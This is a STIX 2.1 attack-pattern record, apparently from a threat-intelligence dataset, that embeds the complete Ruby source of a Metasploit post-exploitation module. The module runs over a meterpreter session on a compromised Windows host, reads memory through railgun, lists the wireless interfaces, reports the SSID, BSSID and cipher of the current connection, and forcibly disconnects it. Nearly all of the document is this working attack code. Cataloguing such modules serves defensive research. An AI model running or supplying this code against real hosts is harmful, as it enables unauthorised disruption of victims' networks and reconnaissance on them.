{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1a4033a-0227-4b49-b8f2-cc4cf2e8a6bc",
    "created": "2024-08-14T16:33:05.006852Z",
    "modified": "2024-08-14T16:33:05.006856Z",
    "name": "Windows Disconnect Wireless Connection",
    "description": " This module disconnects the current wireless network connection on the specified interface.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/wlan/wlan_disconnect.rb",
            "external_id": "wlan_disconnect.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Disconnect Wireless Connection',\n        'Description' => %q{\n          This module disconnects the current wireless network connection\n          on the specified interface.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptInt.new('Interface', [true, 'The Index of the Interface to Disconnect. Leave at 0 if only one IF', 0])\n    ])\n  end\n\n  def run\n    # Opens memory access into the host process\n    mypid = client.sys.process.getpid\n    @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)\n    @wlanapi = client.railgun.wlanapi\n\n    wlan_connections = \"Wireless LAN Active Connections: \\n\"\n    wlan_handle = open_handle\n    unless wlan_handle\n      print_error(\"Couldn't open WlanAPI Handle. WLAN API may not be installed on target\")\n      print_error('On Windows XP this could also mean the Wireless Zero Configuration Service is turned off')\n      return\n    end\n    wlan_iflist = enum_interfaces(wlan_handle)\n    if wlan_iflist[datastore['Interface']]\n      connect_info = query_current_connection(wlan_handle, wlan_iflist[datastore['Interface']]['guid'])\n      if connect_info\n        guid = guid_to_string(wlan_iflist[datastore['Interface']]['guid'])\n        wlan_connection = \"GUID: #{guid} \\nDescription: #{wlan_iflist[datastore['Interface']]['description']} \\nState: #{wlan_iflist[datastore['Interface']]['state']}\\n\"\n        wlan_connection << \"Currently Connected to: \\n\"\n        wlan_connection << \"\\tMode: #{connect_info['mode']} \\n\\tProfile: #{connect_info['profile']} \\n\"\n        wlan_connection << \"\\tSSID: #{connect_info['ssid']} \\n\\tAP MAC: #{connect_info['bssid']} \\n\"\n        wlan_connection << \"\\tBSS Type: #{connect_info['type']} \\n\\tPhysical Type: #{connect_info['physical']} \\n\"\n        wlan_connection << \"\\tSignal Strength: #{connect_info['signal']} \\n\\tRX Rate: #{connect_info['rxrate']} \\n\"\n        wlan_connection << \"\\tTX Rate: #{connect_info['txrate']} \\n\\tSecurity Enabled: #{connect_info['security']} \\n\"\n        wlan_connection << \"\\toneX Enabled: #{connect_info['oneX']} \\n\\tAuthentication Algorithm: #{connect_info['auth']} \\n\"\n        wlan_connection << \"\\tCipher Algorithm: #{connect_info['cipher']} \\n\"\n        print_status(wlan_connection)\n\n        print_status('Disconnecting...')\n        @wlanapi.WlanDisconnect(wlan_handle, wlan_iflist[datastore['Interface']]['guid'], nil)\n        sleep(10)\n\n        connected = query_current_connection(wlan_handle, wlan_iflist[datastore['Interface']]['guid'])\n        if connected\n          print_error('The Interface still appears to be connected.')\n          closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)\n          if closehandle['return'] == 0\n            print_status('WlanAPI Handle Closed Successfully')\n          else\n            print_error('There was an error closing the Handle')\n          end\n          return\n        else\n          print_good('The Interface has been disconnected successfully')\n        end\n      else\n        print_error('This Interface is not currently connected to a network.')\n        closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)\n        if closehandle['return'] == 0\n          print_status('WlanAPI Handle Closed Successfully')\n        else\n          print_error('There was an error closing the Handle')\n        end\n        return\n      end\n    else\n      print_error('The Supplied Interface Index is Invalid')\n      closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)\n      if closehandle['return'] == 0\n        print_status('WlanAPI Handle Closed Successfully')\n      else\n        print_error('There was an error closing the Handle')\n      end\n      return\n    end\n\n    # close the Wlan API Handle\n    closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)\n    if closehandle['return'] == 0\n      print_status('WlanAPI Handle Closed Successfully')\n    else\n      print_error('There was an error closing the Handle')\n    end\n  end\n\n  def open_handle\n    begin\n      wlhandle = @wlanapi.WlanOpenHandle(2, nil, 4, 4)\n    rescue StandardError\n      return nil\n    end\n    return wlhandle['phClientHandle']\n  end\n\n  def query_current_connection(wlan_handle, guid)\n    connection = {}\n    conn_info = @wlanapi.WlanQueryInterface(wlan_handle, guid, 7, nil, 4, 4, nil)\n\n    # Grab the pointer to our data structure. We skip voer the Interface State since we already have it\n    # We interpret the connection mode used first\n    pointer = conn_info['ppData']\n    pointer = (pointer + 4)\n    mode = @host_process.memory.read(pointer, 4)\n    mode = mode.unpack('V')[0]\n    case mode\n    when 0\n      connection['mode'] = 'A profile is used to make the connection.'\n    when 1\n      connection['mode'] = 'A temporary profile is used to make the connection.'\n    when 2\n      connection['mode'] = 'Secure discovery is used to make the connection.'\n    when 3\n      connection['mode'] = 'Unsecure discovery is used to make the connection.'\n    when 4\n      connection['mode'] = 'connection initiated by wireless service automatically using a persistent profile.'\n    when 5\n      connection['mode'] = 'Invalid connection mode.'\n    else\n      connection['state'] = 'Unknown connection Mode.'\n    end\n\n    # Grab the wirelessprofile name used in the connection\n    pointer = (pointer + 4)\n    profile = @host_process.memory.read(pointer, 512)\n    connection['profile'] = profile.gsub(/\\x00/, '')\n\n    # Check the size of the SSID value. If we get nothing back, the interface is not currently connected\n    # We return nil and deal with the results back in the calling function\n    pointer = (pointer + 512)\n    len_ssid = @host_process.memory.read(pointer, 4)\n    unless len_ssid.unpack('V')[0]\n      return nil\n    end\n\n    # Grabs the SSID of the BSS connected to\n    pointer = (pointer + 4)\n    ssid = @host_process.memory.read(pointer, 32)\n    connection['ssid'] = ssid.gsub(/\\x00/, '')\n\n    # Grabs what type of a BSS this is and itnerpretes it into human readable\n    pointer = (pointer + 32)\n    bsstype = @host_process.memory.read(pointer, 4)\n    bsstype = bsstype.unpack('V')[0]\n    case bsstype\n    when 1\n      connection['type'] = 'Infrastructure'\n    when 2\n      connection['type'] = 'Independent'\n    when 3\n      connection['type'] = 'Any'\n    else\n      connection['type'] = 'Unknown BSS Type'\n    end\n\n    # Grabs the BSS MAC address\n    pointer = (pointer + 4)\n    bssid = @host_process.memory.read(pointer, 6)\n    bssid = bssid.unpack('H*')[0]\n    bssid.insert(2, ':')\n    bssid.insert(5, ':')\n    bssid.insert(8, ':')\n    bssid.insert(11, ':')\n    bssid.insert(14, ':')\n    connection['bssid'] = bssid\n\n    # Grabs the physical association type and interprets it into human readable\n    pointer = (pointer + 8)\n    phy_type = @host_process.memory.read(pointer, 4)\n    phy_type = phy_type.unpack('V')[0]\n    case phy_type\n    when 1\n      connection['physical'] = 'Frequency-hopping spread-spectrum (FHSS)'\n    when 2\n      connection['physical'] = 'Direct sequence spread spectrum (DSSS)'\n    when 3\n      connection['physical'] = 'Infrared (IR) baseband'\n    when 4\n      connection['physical'] = 'Orthogonal frequency division multiplexing (OFDM)'\n    when 5\n      connection['physical'] = 'High-rate DSSS (HRDSSS)'\n    when 6\n      connection['physical'] = 'Extended rate PHY type'\n    when 7\n      connection['physical'] = '802.11n PHY type'\n    else\n      connection['physical'] = 'Unknown Association Type'\n    end\n\n    # Grabs the signal strength value\n    pointer = (pointer + 8)\n    signal = @host_process.memory.read(pointer, 4)\n    connection['signal'] = signal.unpack('V')[0]\n\n    # Grabs the recieve rate value\n    pointer = (pointer + 4)\n    rxrate = @host_process.memory.read(pointer, 4)\n    connection['rxrate'] = rxrate.unpack('V')[0]\n\n    # Grabs the transmit rate value\n    pointer = (pointer + 4)\n    txrate = @host_process.memory.read(pointer, 4)\n    connection['txrate'] = txrate.unpack('V')[0]\n\n    # Checks if security is enabled on this BSS\n    pointer = (pointer + 4)\n    security_enabled = @host_process.memory.read(pointer, 4)\n    if security_enabled.unpack('V')[0] == 1\n      connection['security'] = 'Yes'\n    else\n      connection['security'] = 'No'\n    end\n\n    # Checks of 802.1x Authentication is used\n    pointer = (pointer + 4)\n    onex = @host_process.memory.read(pointer, 4)\n    if onex.unpack('V')[0] == 1\n      connection['oneX'] = 'Yes'\n    else\n      connection['oneX'] = 'No'\n    end\n\n    # Determines wat Authentication Algorithm is being used\n    pointer = (pointer + 4)\n    algo = @host_process.memory.read(pointer, 4)\n    algo = algo.unpack('V')[0]\n    case algo\n    when 1\n      connection['auth'] = '802.11 Open'\n    when 2\n      connection['auth'] = '802.11 Shared'\n    when 3\n      connection['auth'] = 'WPA'\n    when 4\n      connection['auth'] = 'WPA-PSK'\n    when 5\n      connection['auth'] = 'WPA-None'\n    when 6\n      connection['auth'] = 'RSNA'\n    when 7\n      connection['auth'] = 'RSNA with PSK'\n    else\n      connection['auth'] = 'Unknown Algorithm'\n    end\n\n    # Determines what Cipher is being used\n    pointer = (pointer + 4)\n    cipher = @host_process.memory.read(pointer, 4)\n    cipher = cipher.unpack('V')[0]\n    case cipher\n    when 0\n      connection['cipher'] = 'None'\n    when 1\n      connection['cipher'] = 'WEP-40'\n    when 2\n      connection['cipher'] = 'TKIP'\n    when 4\n      connection['cipher'] = 'CCMP'\n    when 5\n      connection['cipher'] = 'WEP-104'\n    when 256\n      connection['cipher'] = 'Use Group Key'\n    when 257\n      connection['cipher'] = 'WEP'\n    else\n      connection['cipher'] = 'Unknown Cipher'\n    end\n    return connection\n  end\n\n  def enum_interfaces(wlan_handle)\n    iflist = @wlanapi.WlanEnumInterfaces(wlan_handle, nil, 4)\n    pointer = iflist['ppInterfaceList']\n\n    numifs = @host_process.memory.read(pointer, 4)\n    numifs = numifs.unpack('V')[0]\n    interfaces = []\n\n    # Set the pointer ahead to the first element in the array\n    pointer = (pointer + 8)\n    (1..numifs).each do |_i|\n      interface = {}\n      # Read the GUID (16 bytes)\n      interface['guid'] = @host_process.memory.read(pointer, 16)\n      pointer = (pointer + 16)\n      # Read the description(up to 512 bytes)\n      interface['description'] = @host_process.memory.read(pointer, 512)\n      pointer = (pointer + 512)\n      # Read the state of the interface (4 bytes)\n      state = @host_process.memory.read(pointer, 4)\n      pointer = (pointer + 4)\n\n      # Turn the state into human readable form\n      state = state.unpack('V')[0]\n      case state\n      when 0\n        interface['state'] = 'The interface is not ready to operate.'\n      when 1\n        interface['state'] = 'The interface is connected to a network.'\n      when 2\n        interface['state'] = 'The interface is the first node in an ad hoc network. No peer has connected.'\n      when 3\n        interface['state'] = 'The interface is disconnecting from the current network.'\n      when 4\n        interface['state'] = 'The interface is not connected to any network.'\n      when 5\n        interface['state'] = 'The interface is attempting to associate with a network.'\n      when 6\n        interface['state'] = 'Auto configuration is discovering the settings for the network.'\n      when 7\n        interface['state'] = 'The interface is in the process of authenticating.'\n      else\n        interface['state'] = 'Unknown State'\n      end\n      interfaces << interface\n    end\n    return interfaces\n  end\n\n  # Convert the GUID to human readable form\n  def guid_to_string(guid)\n    aguid = guid.unpack('H*')[0]\n    sguid = '{' + aguid[6, 2] + aguid[4, 2] + aguid[2, 2] + aguid[0, 2]\n    sguid << '-' + aguid[10, 2] + aguid[8, 2] + '-' + aguid[14, 2] + aguid[12, 2] + '-' + aguid[16, 4]\n    sguid << '-' + aguid[20, 12] + '}'\n    return sguid\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}